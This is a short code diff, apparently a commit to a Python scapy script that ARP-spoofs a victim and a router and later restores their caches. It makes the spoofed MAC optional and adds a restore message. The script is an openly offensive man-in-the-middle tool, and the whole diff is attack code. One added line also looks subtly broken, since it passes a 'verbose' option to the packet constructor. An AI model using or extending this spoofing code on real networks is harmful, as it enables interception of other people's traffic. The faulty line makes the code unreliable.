@@ -14,14 +14,18 @@ def find_mac(ip: str) -> str:
         print(f'{ip} is not responding to arp')
         return ''
 
-    return arp_res[Ether].hwsrc
+    return arp_res[Ether].src
 
 
 def arp_spoof(target_ip: str, spoofed_ip: str, spoofed_mac: str = ''):
     target_mac = find_mac(ip=target_ip)
 
     if target_mac:
-        arp_reply = ARP(op=ARP_REPLY, hwdst=target_mac, hwsrc=spoofed_mac, pdst=target_ip, prsc=spoofed_ip)
+        arp_reply = ARP(op=ARP_REPLY, hwdst=target_mac, pdst=target_ip, psrc=spoofed_ip, verbose=True)
+        
+        if spoofed_mac:
+            arp_reply.hwsrc = spoofed_mac
+
         send(arp_reply)
 
 
@@ -40,6 +44,7 @@ def main():
         # restore
         arp_spoof(target_ip=router_ip, spoofed_ip=victim_ip, spoofed_mac=find_mac(victim_ip))
         arp_spoof(target_ip=victim_ip, spoofed_ip=router_ip, spoofed_mac=find_mac(router_ip))
+        print('Arp Cache restored!')
         
 
 
